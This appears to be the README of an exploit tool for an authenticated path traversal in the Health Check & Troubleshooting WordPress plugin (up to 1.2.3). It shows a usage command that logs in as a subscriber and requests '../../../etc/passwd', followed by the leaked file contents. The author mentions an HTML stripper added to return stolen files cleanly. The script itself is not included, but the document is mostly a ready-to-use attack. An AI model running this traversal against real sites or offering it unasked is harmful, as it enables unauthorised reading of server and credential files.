# health-check
Health Check &amp; Troubleshooting &lt;= 1.2.3 - Subscriber+ Path Traversal


# Description
The Health Check & Troubleshooting WordPress plugin was affected by an Authenticated Path Traversal security vulnerability.

# Note

Due to the response from the plugin it adds so much html around things i've put a html stripper inside the code of the exploit so it returns the files with out the html.

Note some files you might be looking at might need have code stripped.


How to use
---

```
$ python3 exploit.py --url http://wordpress.lan --user user --password useruser1 --file  ./../../../../../../../etc/passwd
Logged in successfully.



 root:x:0:0:root:/root:/bin/bash
 </body></html>
  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
  bin:x:2:2:bin:/bin:/usr/sbin/nologin
  sys:x:3:3:sys:/dev:/usr/sbin/nologin
  sync:x:4:65534:sync:/bin:/bin/sync
  games:x:5:60:games:/usr/games:/usr/sbin/nologin
  man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
  lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
  mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
  news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
  uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
  proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
  www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
  backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
  list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
  irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
  gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
  nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
  _apt:x:100:65534::/nonexistent:/usr/sbin/nologin


```
